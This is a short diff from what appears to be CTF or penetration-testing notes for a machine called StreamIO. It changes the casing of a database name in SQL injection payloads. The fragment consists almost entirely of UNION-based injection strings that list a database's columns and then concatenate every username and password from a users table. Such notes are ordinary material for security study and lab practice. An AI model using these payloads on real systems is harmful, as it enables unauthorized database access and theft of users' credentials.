@@ -460,5 +460,5 @@ Used in ```StreamIO```
 /* show all columns */
 ' UNION SELECT 1, (SELECT STRING_AGG(COLUMN_NAME, ',') FROM STREAMIO.INFORMATION_SCHEMA.COLUMNS), 3, '4', '5', '6';--
 /* get the usernames and passwords */
-' UNION SELECT 1, (SELECT STRING_AGG(username, ',') + STRING_AGG(password, ',') FROM streamio.dbo.users), 3, '4', '5', '6';--
+' UNION SELECT 1, (SELECT STRING_AGG(username, ',') + STRING_AGG(password, ',') FROM STREAMIO.dbo.users), 3, '4', '5', '6';--
 ```
